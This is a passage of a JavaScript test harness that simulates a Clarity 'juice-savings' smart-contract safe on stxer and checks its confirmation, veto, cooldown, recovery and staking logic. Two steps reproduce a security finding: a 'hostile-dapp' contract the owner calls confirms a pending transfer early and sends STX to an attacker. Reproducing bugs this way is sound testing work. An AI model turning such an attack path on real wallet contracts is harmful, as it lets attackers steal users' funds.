  call("Q7 passkey stx 150 -> op7 passkey-created", RELAYER, B, "stx-transfer", stxArgs(STX_OVER, sa(B, 5, T.stx(5, STX_OVER, RECIPIENT))), okre);
  call("Q8 owner stx 150 -> op8 admin-created", OWNER, B, "stx-transfer", stxArgs(STX_OVER, noneCV()), okre);
  call("Q9 owner stx 150 -> op9 admin-created", OWNER, B, "stx-transfer", stxArgs(STX_OVER, noneCV()), okre);
  op(B, 0, "op0"); op(B, 1, "op1"); op(B, 6, "op6");
  snap(B, "b1");
  // STX -now
  call("E1 op1 (passkey-created): relayer + passkey sig -> u4001 (the passkey cannot confirm its own op)", RELAYER, B, "execute-pending-stx-transfer-now", [uintCV(1), noneCV(), sa(B, 10, T.now(10, 1)), noneCV()], "(err u4001)");
  call("E2 op1: RANDOM, no sig -> u4001", RANDOM, B, "execute-pending-stx-transfer-now", [uintCV(1), noneCV(), noneCV(), noneCV()], "(err u4001)");
  call("E3 op1: owner with memo some -> u4021 (renumbered err-memo-mismatch)", OWNER, B, "execute-pending-stx-transfer-now", [uintCV(1), someCV(bufferCV(Buffer.from("m"))), noneCV(), noneCV()], "(err u4021)");
  call("E4 owner turns the token lock on", OWNER, B, "toggle-token-lock", [trueCV(), noneCV(), noneCV()], okre);
  call("E5 op1: owner while locked -> u4019 (renumbered err-token-locked)", OWNER, B, "execute-pending-stx-transfer-now", [uintCV(1), noneCV(), noneCV(), noneCV()], "(err u4019)");
  call("E6 owner turns the lock off", OWNER, B, "toggle-token-lock", [falseCV(), noneCV(), noneCV()], okre);
  snap(B, "b2");
  call("E7 op1: owner confirms (no sig, gas passed but unused) -> 150 STX moves before the cooldown", OWNER, B, "execute-pending-stx-transfer-now", [uintCV(1), noneCV(), noneCV(), GASCV], okre);
  snap(B, "b3");
  call("E8 op1 again -> u4011 (renumbered err-already-executed)", OWNER, B, "execute-pending-stx-transfer-now", [uintCV(1), noneCV(), noneCV(), noneCV()], "(err u4011)");
  call("E9 op1 plain execute (executed) -> u4011", OWNER, B, "execute-pending-stx-transfer", [uintCV(1), noneCV()], "(err u4011)");
  call("E10 op0 (admin-created): owner, no sig -> u4001 (admin cannot confirm its own op)", OWNER, B, "execute-pending-stx-transfer-now", [uintCV(0), noneCV(), noneCV(), noneCV()], "(err u4001)");
  call("E11 op0: passkey sig for op9 -> u4002", RELAYER, B, "execute-pending-stx-transfer-now", [uintCV(0), noneCV(), sa(B, 11, T.now(11, 9)), noneCV()], "(err u4002)");
  call("E12 op0: passkey sig made for safe A -> u4002", RELAYER, B, "execute-pending-stx-transfer-now", [uintCV(0), noneCV(), sa(A, 12, T.now(12, 0)), noneCV()], "(err u4002)");
  const e13 = sa(B, 13, T.now(13, 0));
  call("E13 op0: passkey confirms, gas -> 150 STX moves, gas paid", RELAYER, B, "execute-pending-stx-transfer-now", [uintCV(0), noneCV(), e13, GASCV], okre);
  snap(B, "b4");
  call("E14 op0 again (fresh sig) -> u4011", RELAYER, B, "execute-pending-stx-transfer-now", [uintCV(0), noneCV(), sa(B, 14, T.now(14, 0)), noneCV()], "(err u4011)");
  call("E15 stx-now on an sBTC op (op3) -> u4010 (renumbered err-invalid-operation)", OWNER, B, "execute-pending-stx-transfer-now", [uintCV(3), noneCV(), noneCV(), noneCV()], "(err u4010)");
  call("E16 stx-now unknown op 99 -> u4010", OWNER, B, "execute-pending-stx-transfer-now", [uintCV(99), noneCV(), noneCV(), noneCV()], "(err u4010)");
  // sBTC -now
  call("S1 op4 (passkey-created): relayer + passkey sig -> u4001", RELAYER, B, "execute-pending-sbtc-transfer-now", [uintCV(4), noneCV(), sa(B, 15, T.now(15, 4)), noneCV()], "(err u4001)");
  call("S2 op4: owner confirms -> 150000 sats move", OWNER, B, "execute-pending-sbtc-transfer-now", [uintCV(4), noneCV(), noneCV(), noneCV()], okre);
  snap(B, "b5");
  call("S3 op3 (admin-created): owner, no sig -> u4001", OWNER, B, "execute-pending-sbtc-transfer-now", [uintCV(3), noneCV(), noneCV(), noneCV()], "(err u4001)");
  call("S4 op3: passkey confirms, no gas -> 150000 sats move", RELAYER, B, "execute-pending-sbtc-transfer-now", [uintCV(3), noneCV(), sa(B, 16, T.now(16, 3)), noneCV()], okre);
  snap(B, "b6");
  call("S5 sbtc-now on an STX op (op8) -> u4010", OWNER, B, "execute-pending-sbtc-transfer-now", [uintCV(8), noneCV(), noneCV(), noneCV()], "(err u4010)");
  // withdrawal -now
  call("W1 op6 (passkey-created): relayer + passkey sig -> u4001", RELAYER, B, "execute-pending-sbtc-withdrawal-now", [uintCV(6), sa(B, 17, T.now(17, 6)), noneCV()], "(err u4001)");
  call("W2 op6: owner confirms -> 121000 sats locked in sbtc-withdrawal", OWNER, B, "execute-pending-sbtc-withdrawal-now", [uintCV(6), noneCV(), noneCV()], okre);
  snap(B, "b7");
  call("W3 op5 (admin-created): owner, no sig -> u4001", OWNER, B, "execute-pending-sbtc-withdrawal-now", [uintCV(5), noneCV(), noneCV()], "(err u4001)");
  call("W4 op5: passkey confirms, gas", RELAYER, B, "execute-pending-sbtc-withdrawal-now", [uintCV(5), sa(B, 18, T.now(18, 5)), GASCV], okre);
  snap(B, "b8");
  call("W5 op5 again -> u4011", RELAYER, B, "execute-pending-sbtc-withdrawal-now", [uintCV(5), sa(B, 19, T.now(19, 5)), noneCV()], "(err u4011)");
  call("W6 withdrawal-now on an STX op (op8) -> u4010", OWNER, B, "execute-pending-sbtc-withdrawal-now", [uintCV(8), noneCV(), noneCV()], "(err u4010)");
  // veto
  call("V1 owner vetoes op7 (passkey-created)", OWNER, B, "veto-operation", [uintCV(7), noneCV(), noneCV()], okre);
  call("V2 op7: owner -now -> u4012 (renumbered err-vetoed)", OWNER, B, "execute-pending-stx-transfer-now", [uintCV(7), noneCV(), noneCV(), noneCV()], "(err u4012)");
  call("V3 passkey vetoes op8 (admin-created)", RELAYER, B, "veto-operation", [uintCV(8), sa(B, 20, T.veto(20, 8)), noneCV()], okre);
  call("V4 op8: passkey -now -> u4012", RELAYER, B, "execute-pending-stx-transfer-now", [uintCV(8), noneCV(), sa(B, 21, T.now(21, 8)), noneCV()], "(err u4012)");
  call("V5 RANDOM veto op9 -> u4001", RANDOM, B, "veto-operation", [uintCV(9), noneCV(), noneCV()], "(err u4001)");
  call("V6 replay V3 veto signature on op8 -> u4006", RELAYER, B, "veto-operation", [uintCV(8), sa(B, 20, T.veto(20, 8)), noneCV()], /^\(err u400[26]\)$/);
  // triage #4: a contract the admin calls confirms a passkey-created op (is-admin-calling tx-sender)
  snap(B, "b9");
  call("P1 (triage #4) owner calls hostile-dapp.claim-airdrop -> op2 (passkey-created) executes before the cooldown", OWNER, HOSTILE, "claim-airdrop", [], okre);
  snap(B, "b10");
  op(B, 2, "op2");
  call("P2 (base, pre-existing) owner calls hostile-dapp.free-mint -> 50 STX under threshold to the attacker", OWNER, HOSTILE, "free-mint", [], okre);
  snap(B, "b11");
  // cooldown on the plain path
  call("L1 op9 plain execute before the cooldown -> u4014 (renumbered err-cooldown-not-passed)", OWNER, B, "execute-pending-stx-transfer", [uintCV(9), noneCV()], "(err u4014)");
  b.addAdvanceBlocks({ bitcoin_blocks: COOLDOWN + 1, stacks_blocks_per_bitcoin: 1 });
  plan.push({ kind: "adv", label: `advance ${COOLDOWN + 1} burn blocks (cooldown)` });
  call("L2 op9 plain execute after the cooldown", OWNER, B, "execute-pending-stx-transfer", [uintCV(9), noneCV()], okre);
  call("L3 op7 (vetoed) plain execute -> u4012", OWNER, B, "execute-pending-stx-transfer", [uintCV(7), noneCV()], "(err u4012)");
  snap(B, "b12");
  // recovery none -> set one later (passkey proposes, admin confirms)
  call("RC1 passkey propose-recovery RECOVERY on B", RELAYER, B, "propose-recovery", [standardPrincipalCV(RECOVERY), auth(B, 22, T.recovery(22, RECOVERY)), noneCV()], okre);
  call("RC2 owner confirm-recovery", OWNER, B, "confirm-recovery", [], okre);
  evalw(B, "RC3 B recovery-address", "(var-get recovery-address)", "brec2");
  // B stakes into the third pool (admin path) + passkey unstake
  call(`BK1 owner stake B ${STAKE_B / 1e6} STX into juice-pool-stx-signer`, OWNER, B, "stake-stx-juice", [cp(P_STX), uintCV(STAKE_B), noneCV(), noneCV(), noneCV()], okre, "BK1");
  snap(B, "b13");
  call("BK2 passkey unstake B (stx-signer), no gas", RELAYER, B, "unstake", [cp(P_STX), sa(B, 23, T.unstake(23)), noneCV()], okre);
  snap(B, "b14");

  // -- run + verify --------------------------------------------------------------------
  console.log(`=== juice-savings stxer harness: ${plan.length} steps ===`);
  const sessionId = await b.run();
  const url = `https://stxer.xyz/simulations/mainnet/${sessionId}`;
  console.log(`Submitted: ${url}\n`);
  const res = await getSimulationResult(sessionId);
  const decTx = (s) => {
    const r = s?.Result?.Transaction;
    if (!r) return "<none>";
    if ("Err" in r) return `ENGINE-ERR: ${JSON.stringify(r.Err).slice(0, 300)}`;
    if (r.Ok.vm_error) return `VM-ERR: ${String(r.Ok.vm_error).slice(0, 300)}`;
    try { return cvToString(deserializeCV(r.Ok.result)); } catch (e) { return `dec-fail: ${e.message}`; }
  };
  const decEval = (s) => {
    const r = s?.Result?.Eval;
    if (!r || !("Ok" in r)) return `<eval:${JSON.stringify(r?.Err ?? "?").slice(0, 200)}>`;
    try { return cvToString(deserializeCV(r.Ok)); } catch { return r.Ok; }
  };
  const prints = (s) => (s?.Result?.Transaction?.Ok?.events ?? []).map((raw) => (typeof raw === "string" ? JSON.parse(raw) : raw))
    .filter((e) => e.type === "contract_event" && e.committed !== false)
    .map((e) => ({ cid: e.contract_event.contract_identifier, v: cvToString(deserializeCV(e.contract_event.raw_value)) }));
  let pass = 0, fail = 0;
  const rows = [], cap = {}, evs = {};
  if (res.steps.length !== plan.length) console.log(`WARN: ${res.steps.length} steps returned, ${plan.length} planned`);
  plan.forEach((p, i) => {
    const s = res.steps[i];
    if (p.kind === "eval") { cap[p.capture] = decEval(s); console.log(`INFO [${i}] ${p.label}: ${String(cap[p.capture]).slice(0, 300)}`); return; }
    if (p.kind === "adv") {
      const r = s?.Result?.AdvanceBlocks, ok = !!r && !("Err" in r);
      console.log(`${ok ? "PASS" : "FAIL"} [${i}] ${p.label}${ok ? "" : `\n        got ${JSON.stringify(s?.Result).slice(0, 200)}`}`);
      ok ? pass++ : fail++; rows.push({ i, label: p.label, actual: ok ? "advanced" : "?", passed: ok }); return;
    }
    const d = decTx(s);
    if (p.ev) evs[p.ev] = prints(s);
    let ok;
    if (p.kind === "fund") ok = !!s && !/^ENGINE-ERR|^VM-ERR|^\(err|^<none>/.test(d);
    else if (p.kind === "deploy") ok = p.expect === "fail" ? /^ENGINE-ERR|^VM-ERR|^\(err/.test(d) : !!s && !/^ENGINE-ERR|^VM-ERR|^\(err|^<none>/.test(d);
    else ok = p.expect instanceof RegExp ? p.expect.test(d) : d === p.expect;
    console.log(`${ok ? "PASS" : "FAIL"} [${i}] ${p.label}\n        got ${d.slice(0, 260)}`);
    ok ? pass++ : fail++;
    rows.push({ i, label: p.label, actual: d.slice(0, 200), passed: ok });
  });

  console.log("\n--- state checks ---");
  const chk = (l, cond, actual = "") => { console.log(`${cond ? "PASS" : "FAIL"} ${l}${cond ? "" : `  (${String(actual).slice(0, 400)})`}`); cond ? pass++ : fail++; rows.push({ i: "-", label: l, actual: String(actual).slice(0, 200), passed: !!cond }); };
  const num = (t, f) => BigInt((String(cap[t]).match(new RegExp(`\\(${f} u(\\d+)\\)`)) || [])[1] ?? "-1");
  const signerOf = (t) => (String(cap[t]).match(/\(signer ([A-Z0-9]+\.[a-z0-9-]+)\)/) || [])[1];
  const unlockCycle = (t) => num(t, "first-reward-cycle") + num(t, "num-cycles");
  const G = GAS;
  for (const m of mirror) chk(`${m.label}: contract hash == JS mirror`, cap[`hash:${m.label}`] === m.want, `${cap[`hash:${m.label}`]} vs ${m.want}`);
  chk("H4 != H1 (same tuple, other safe -> other hash)", cap["hash:H4 build-stake-stx-juice-pool-hash from B (domain binds B)"] !== cap["hash:H1 build-stake-stx-juice-pool-hash (cd none)"]);
  chk("O13 A, B, C whitelisted; evil-savings not; A recovery = RECOVERY", /\(a true\)/.test(cap.wl) && /\(b true\)/.test(cap.wl) && /\(c true\)/.test(cap.wl) && /\(e false\)/.test(cap.wl) && cap.wl.includes(`(ra ${RECOVERY})`), cap.wl);
  chk("O14 B onboarded with recovery none -> recovery-address SP000...", cap.brec.includes("(r SP000000000000000000002Q6VF78)") && cap.brec.includes(`(o ${OWNER})`), cap.brec);
  chk(`K11 A locked ${STAKE_A} with juice-pool-sbtc-signer, 96 cycles, gas ${G} paid`, num("a1", "locked") === BigInt(STAKE_A) && signerOf("a1") === P_SBTC
    && unlockCycle("a1") === num("a1", "cyc") + 97n && num("a0", "sbtc") - num("a1", "sbtc") === G, cap.a1);
  chk("K11 safe print carries pool = juice-pool-sbtc-signer", (evs.K11 ?? []).some((e) => e.cid === A && e.v.includes(`(pool ${P_SBTC})`)), JSON.stringify(evs.K11));
  chk(`U11 0/0 switch: signer stx-signer, locked still ${STAKE_A}, same unlock cycle, gas ${G}`, signerOf("a2") === P_STX && num("a2", "locked") === BigInt(STAKE_A)
    && unlockCycle("a2") === unlockCycle("a1") && num("a1", "sbtc") - num("a2", "sbtc") === G, cap.a2);
  chk("U11 pox-5 stake-update print: old-signer sbtc-signer -> signer stx-signer", (evs.U11 ?? []).some((e) => e.cid === POX5 && e.v.includes(`(old-signer ${P_SBTC})`) && e.v.includes(`(signer ${P_STX})`)), JSON.stringify(evs.U11));
  chk(`U12 locked ${STAKE_A + INC_A}`, num("a3", "locked") === BigInt(STAKE_A + INC_A) && signerOf("a3") === P_STX, cap.a3);
  chk("U13 switched to fastpool, locked unchanged", signerOf("a4") === P_FAST && num("a4", "locked") === BigInt(STAKE_A + INC_A), cap.a4);
  chk("U14 fastpool stored A's payout config from calldata", /^\(some \(tuple/.test(cap.payA1) && cap.payA1.includes("(max-fee u1000)") && cap.payA1.includes("(min-claim u5000)"), cap.payA1);
  chk("R3/R4 (#5 fixed) refused restake left A's fastpool payout config in place", /^\(some \(tuple/.test(cap.payA2) && cap.payA2 === cap.payA1, cap.payA2);
  chk("X3 unstake: lock ends next cycle", unlockCycle("a6") === num("a6", "cyc") + 1n, cap.a6);
  chk("C1 C staked 500 STX with juice-pool-sbtc-signer", signerOf("c1") === P_SBTC && num("c1", "locked") === BigInt(STAKE_C), cap.c1);
  chk("C3 keeper restake locked all of C's unlocked STX, pool unchanged", num("c2", "locked") === num("c1", "locked") + num("c1", "unlocked") && num("c2", "unlocked") === 0n && signerOf("c2") === P_SBTC, cap.c2);
  chk("C3 pox-5 stake-update print: signer = old-signer = juice-pool-sbtc-signer", (evs.C3 ?? []).some((e) => e.cid === POX5 && e.v.includes(`(old-signer ${P_SBTC})`) && e.v.includes(`(signer ${P_SBTC})`)), JSON.stringify(evs.C3));
  chk("op0 admin-created, op1/op6 passkey-created", /\(passkey-created false\)/.test(cap.op0) && /\(passkey-created true\)/.test(cap.op1) && /\(passkey-created true\)/.test(cap.op6), `${cap.op0} | ${cap.op1}`);
  chk("Q0..Q9 queued, nothing moved", num("b1", "unlocked") === num("b0", "unlocked") && num("b1", "sbtc") === num("b0", "sbtc"), cap.b1);
  chk(`E7 owner confirm of op1: safe -150 STX, recipient +150 STX, no gas`, num("b2", "unlocked") - num("b3", "unlocked") === BigInt(STX_OVER) && num("b3", "rstx") - num("b2", "rstx") === BigInt(STX_OVER) && num("b3", "sbtc") === num("b2", "sbtc"), cap.b3);
  chk(`E13 passkey confirm of op0: -150 STX, gas ${G}`, num("b3", "unlocked") - num("b4", "unlocked") === BigInt(STX_OVER) && num("b3", "sbtc") - num("b4", "sbtc") === G, cap.b4);
  chk("S2 owner confirm of op4: -150000 sats to recipient", num("b4", "sbtc") - num("b5", "sbtc") === BigInt(SBTC_OVER) && num("b5", "rsbtc") - num("b4", "rsbtc") === BigInt(SBTC_OVER), cap.b5);
  chk("S4 passkey confirm of op3: -150000 sats, no gas", num("b5", "sbtc") - num("b6", "sbtc") === BigInt(SBTC_OVER), cap.b6);
  chk("W2 owner confirm of op6: 121000 sats leave the safe (locked in the withdrawal request)", num("b6", "sbtc") - num("b7", "sbtc") === BigInt(WD_OVER + WD_FEE), cap.b7);
  chk(`W4 passkey confirm of op5: 121000 sats + gas ${G}`, num("b7", "sbtc") - num("b8", "sbtc") === BigInt(WD_OVER + WD_FEE) + G, cap.b8);
  chk("P1 (triage #4 REPRODUCED if PASS) hostile contract confirmed op2: 150 STX to the op recipient before the cooldown", num("b9", "unlocked") - num("b10", "unlocked") === BigInt(STX_OVER)
    && num("b10", "rstx") - num("b9", "rstx") === BigInt(STX_OVER) && /\(executed true\)/.test(cap.op2), `${cap.b10} | ${cap.op2}`);
  chk("P2 (base) hostile contract moved 50 STX to the attacker", num("b11", "xstx") - num("b10", "xstx") === BigInt(HOSTILE_UNDER), cap.b11);
  chk("L2 op9 after cooldown: -150 STX", num("b11", "unlocked") - num("b12", "unlocked") === BigInt(STX_OVER), cap.b12);
  chk("RC3 B recovery-address set to RECOVERY after starting from none", cap.brec2 === RECOVERY, cap.brec2);
  chk(`BK1 B locked ${STAKE_B} with juice-pool-stx-signer`, signerOf("b13") === P_STX && num("b13", "locked") === BigInt(STAKE_B), cap.b13);
  chk("BK2 B unstake: lock ends next cycle", unlockCycle("b14") === num("b14", "cyc") + 1n, cap.b14);

  const total = pass + fail;
  console.log(`\n=== ${pass} passed, ${fail} failed (${total}) ===\nView: ${url}`);
  fs.mkdirSync("fixtures", { recursive: true });
  fs.writeFileSync("fixtures/simul-juice-savings-result.json", JSON.stringify({
    simulation: url, passed: pass, total, startBurn, gasSats: String(GAS),
    sources: { "juice-savings": { sha256: h(safeSrc), bytes: Buffer.byteLength(safeSrc), clarity: 6 }, "juice-safe-auth-helpers-v3": { sha256: h(helperSrc), clarity: 4 } },
    rows,
  }, null, 1) + "\n");
  if (fail > 0) process.exit(1);
}

main().catch((e) => { console.error(e); process.exit(1); });
